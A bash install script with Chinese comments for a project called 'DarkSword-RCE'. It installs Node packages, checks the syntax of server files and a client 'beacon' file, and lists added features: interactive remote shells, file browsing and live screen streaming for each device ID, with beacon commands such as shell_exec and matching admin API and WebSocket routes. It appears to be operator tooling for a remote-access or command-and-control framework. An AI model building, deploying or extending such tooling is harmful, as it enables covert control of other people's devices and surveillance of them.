#!/bin/bash
#
# final_install.sh — 最终安装和测试脚本
#
# 用途：安装依赖、验证集成、启动服务

set -e

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  DarkSword-RCE 完整功能安装"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# 检查 Node.js
if ! command -v node &> /dev/null; then
    echo "❌ 未安装 Node.js"
    exit 1
fi

echo "✓ Node.js: $(node -v)"
echo ""

# 安装依赖
echo "[1/4] 安装新依赖..."
npm install ws@8.16.0 node-pty@1.0.0 sharp@0.33.2

echo ""
echo "[2/4] 验证依赖..."
node -e "
  try {
    require('ws');
    require('node-pty');
    require('sharp');
    console.log('✓ 所有依赖已安装');
  } catch (e) {
    console.error('❌ 依赖验证失败:', e.message);
    process.exit(1);
  }
"

echo ""
echo "[3/4] 验证服务端代码..."
node --check server/admin_server.js && echo "✓ admin_server.js 语法正确"
node --check server/interactive_shell.js && echo "✓ interactive_shell.js 语法正确"
node --check server/screen_stream.js && echo "✓ screen_stream.js 语法正确"

echo ""
echo "[4/4] 验证客户端代码..."
node --check client/beacon_complete_integration.js && echo "✓ beacon_complete_integration.js 语法正确"

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 安装完成！"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "已集成功能："
echo "  ✓ 交互式 Shell (WebSocket + pty)"
echo "  ✓ 文件浏览器 API"
echo "  ✓ 实时屏幕流 (差分推流)"
echo ""
echo "新增命令 (客户端)："
echo "  • start_interactive_shell"
echo "  • shell_exec"
echo "  • shell_get_output"
echo "  • shell_close"
echo "  • start_screen_stream"
echo "  • stop_screen_stream"
echo "  • screen_stream_status"
echo "  • list_files_json"
echo ""
echo "新增 API 路由 (服务端)："
echo "  • GET  /admin/api/files/:deviceId?path=xxx"
echo "  • GET  /admin/api/screen/:deviceId"
echo "  • GET  /admin/api/shell/sessions"
echo "  • DELETE /admin/api/shell/:deviceId"
echo ""
echo "WebSocket 端点："
echo "  • ws://localhost:8888/ws/shell/:deviceId"
echo "  • ws://localhost:8888/ws/screen/:deviceId"
echo ""
echo "下一步："
echo "  1. 启动服务器: npm start"
echo "  2. 测试命令: curl http://localhost:8888/admin/api/shell/sessions"
echo "  3. 查看完整文档: cat COMPLETE_IMPLEMENTATION_GUIDE.md"
echo ""